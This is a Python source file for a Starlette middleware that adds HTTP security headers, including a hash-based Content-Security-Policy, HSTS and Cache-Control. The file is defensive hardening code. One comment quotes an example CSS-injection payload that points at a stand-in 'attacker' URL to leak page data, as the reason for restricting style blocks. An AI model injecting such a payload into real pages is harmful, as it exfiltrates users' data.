"""HTTP security headers middleware.

Sets the standard hardening headers on every response. The header
set + values are static enough that this is a thin wrapper around
``starlette.middleware.base.BaseHTTPMiddleware`` - there is no
per-request configuration.

Headers set on EVERY response:
- ``X-Content-Type-Options: nosniff``
- ``X-Frame-Options: DENY``
- ``Referrer-Policy: strict-origin-when-cross-origin`` (default;
  ``no-referrer`` for /setup paths)
- ``Permissions-Policy: <restrictive>``
- ``Cross-Origin-Opener-Policy: same-origin``
- ``Cross-Origin-Resource-Policy: same-origin``

Conditional:
- ``Strict-Transport-Security`` in every non-``dev`` environment when
  ``public_url`` starts with ``https://``.
- ``Content-Security-Policy`` only on HTML responses (those whose
  ``Content-Type`` starts with ``text/html``).
- ``Cache-Control: no-store`` only on responses to authenticated
  paths (anything matching ``/api/v1/auth`` or ``/api/v1/setup``).

Why a separate middleware: this layer has no business logic and is
the kind of thing security teams will explicitly look for in a
review. Keeping it tiny + obvious means a reviewer can audit it in
30 seconds.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

from starlette.middleware.base import BaseHTTPMiddleware, RequestResponseEndpoint
from starlette.requests import Request
from starlette.responses import Response

if TYPE_CHECKING:
    from z4j_brain.settings import Settings


_PERMISSIONS_POLICY: str = (
    "geolocation=(), microphone=(), camera=(), payment=(), "
    "usb=(), accelerometer=(), gyroscope=(), magnetometer=()"
)

# The dashboard intentionally keeps CSP3 ``script-src`` and
# ``style-src-elem`` closed to arbitrary inline content.  Its three
# deterministic first-party blocks therefore need exact hashes:
#
# * the tiny pre-paint theme bootstrap in dashboard/dist/index.html;
# * Sonner's empty staging ``<style>`` element; and
# * Sonner 2.0.8's bundled toast stylesheet.
#
# These are content hashes, not ``'unsafe-inline'`` exceptions.  A dependency
# or dashboard change that alters any block must fail the production-browser
# console gate and be reviewed before this allow-list changes.
_DASHBOARD_THEME_SCRIPT_HASH = "'sha256-RFEpINNvPta15f5pE0PyKRovi4m3SdBKevzA8hX1Shg='"
_DASHBOARD_SONNER_EMPTY_STYLE_HASH = "'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU='"
_DASHBOARD_SONNER_STYLE_HASH = "'sha256-StEaX+se6YS7pqjzrzMIA0KaX9zF/8zAhvQXZAe5epY='"

_BASE_CSP: str = (
    "default-src 'self'; "
    f"script-src 'self' {_DASHBOARD_THEME_SCRIPT_HASH}; "
    # CSP3 split: ``style-src-elem`` governs ``<style>`` blocks
    # and ``<link rel=stylesheet>`` (the high-impact CSS-
    # injection vector for data exfiltration via attribute
    # selectors). ``style-src-attr`` governs ``style="..."``
    # attributes which Radix portals, the TanStack Router head
    # injection, and a handful of our own React ``style={}``
    # props all require.
    #
    # We keep ``'self'`` ONLY on elem so an attacker can no
    # longer inject ``<style>body{background:url(attacker/?x=)}``
    # blocks, but our own Radix dropdowns / tooltips continue
    # to work via attr. The legacy ``style-src`` fallback stays
    # permissive so older browsers (that don't understand the
    # -elem / -attr split) keep functioning.
    "style-src 'self' 'unsafe-inline'; "
    f"style-src-elem 'self' {_DASHBOARD_SONNER_EMPTY_STYLE_HASH} "
    f"{_DASHBOARD_SONNER_STYLE_HASH}; "
    "style-src-attr 'unsafe-inline'; "
    "img-src 'self' data:; "
    "font-src 'self'; "
    "connect-src 'self'; "
    "form-action 'self'; "
    "frame-ancestors 'none'; "
    # frame-src 'none' explicitly closes the iframe-injection
    # vector even though no current page embeds iframes.
    "frame-src 'none'; "
    "base-uri 'none'; "
    "object-src 'none'"
)

_SETUP_CSP_TEMPLATE: str = (
    "default-src 'none'; "
    "script-src 'self' 'nonce-{nonce}'; "
    "style-src 'self' 'nonce-{nonce}'; "
    "connect-src 'self'; "
    "form-action 'self'; "
    "base-uri 'none'; "
    "frame-ancestors 'none'"
)
# Fallback when no nonce is provided (e.g. the /setup 404 plaintext
# response). The 404 has no inline script or style blocks, so
# ``'self'`` alone is sufficient and ``'unsafe-inline'`` is dropped
# entirely.
_SETUP_CSP_FALLBACK: str = (
    "default-src 'none'; "
    "script-src 'self'; "
    "style-src 'self'; "
    "connect-src 'self'; "
    "form-action 'self'; "
    "base-uri 'none'; "
    "frame-ancestors 'none'"
)

_AUTH_PATH_PREFIXES: tuple[str, ...] = (
    "/api/v1/auth",
    "/api/v1/setup",
)


class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    """Inject the brain's security header set on every response.

    Holds a reference to ``Settings`` so it can decide whether to
    emit HSTS based on environment + public_url. The decision is
    made once per request - there is no startup-time short-circuit
    because that would prevent the brain from picking up a
    setting change without a restart (good in production, bad in
    tests).
    """

    def __init__(self, app, *, settings: Settings) -> None:  # type: ignore[no-untyped-def]
        super().__init__(app)
        self._settings = settings

    async def dispatch(
        self,
        request: Request,
        call_next: RequestResponseEndpoint,
    ) -> Response:
        response = await call_next(request)

        headers = response.headers
        headers.setdefault("X-Content-Type-Options", "nosniff")
        headers.setdefault("X-Frame-Options", "DENY")
        headers.setdefault("Permissions-Policy", _PERMISSIONS_POLICY)
        headers.setdefault("Cross-Origin-Opener-Policy", "same-origin")
        headers.setdefault("Cross-Origin-Resource-Policy", "same-origin")

        # Scope path, not ``request.url``. This middleware is registered last
        # and therefore runs OUTERMOST, ahead of HostValidationMiddleware, so
        # it sees the client-supplied Host header before anything has vetted
        # it. ``request.url`` rebuilds a URL from that header and parses it
        # with ``urlsplit``, which Python 3.14 made raise ``ValueError:
        # Invalid IPv6 URL`` on exactly the malformed hosts host validation
        # exists to reject. Reading the path here turned an attacker-controlled
        # header into an unhandled exception instead of the clean 400 the
        # inner middleware was about to return.
        path = request.scope.get("path", "")
        if path.startswith("/setup") or path.startswith("/api/v1/setup"):
            headers["Referrer-Policy"] = "no-referrer"
        else:
            headers.setdefault(
                "Referrer-Policy",
                "strict-origin-when-cross-origin",
            )

        # Cache-Control for any auth-touching path. Defence in
        # depth - handlers can also set this directly.
        for prefix in _AUTH_PATH_PREFIXES:
            if path.startswith(prefix):
                headers["Cache-Control"] = "no-store"
                break

        # CSP for HTML responses only.
        content_type = headers.get("content-type", "")
        if content_type.startswith("text/html"):
            if path.startswith("/setup"):
                # S-6: prefer the per-request nonce variant when the
                # handler supplied one; fall back to the no-inline
                # version for routes (404 etc.) that have no inline
                # blocks at all. ``MutableHeaders`` has no ``pop``;
                # use ``get`` + ``del`` so the internal marker
                # never leaks to the wire.
                nonce = headers.get("X-Z4J-CSP-Nonce")
                if nonce is not None:
                    del headers["X-Z4J-CSP-Nonce"]
                csp = _SETUP_CSP_TEMPLATE.format(nonce=nonce) if nonce else _SETUP_CSP_FALLBACK
            else:
                csp = _BASE_CSP
            headers.setdefault("Content-Security-Policy", csp)

        # HSTS on any HTTPS deployment that is not dev. This was gated on the
        # exact string "production", so a deployment labelled "staging" served
        # HTTPS with production cookies and production host validation and no
        # HSTS, which is the one combination nobody would choose deliberately.
        if not self._settings.is_dev and self._settings.public_url.startswith("https://"):
            hsts_value = f"max-age={self._settings.hsts_max_age_seconds}"
            if self._settings.hsts_include_subdomains:
                hsts_value += "; includeSubDomains"
            headers.setdefault(
                "Strict-Transport-Security",
                hsts_value,
            )

        return response


__all__ = ["SecurityHeadersMiddleware"]
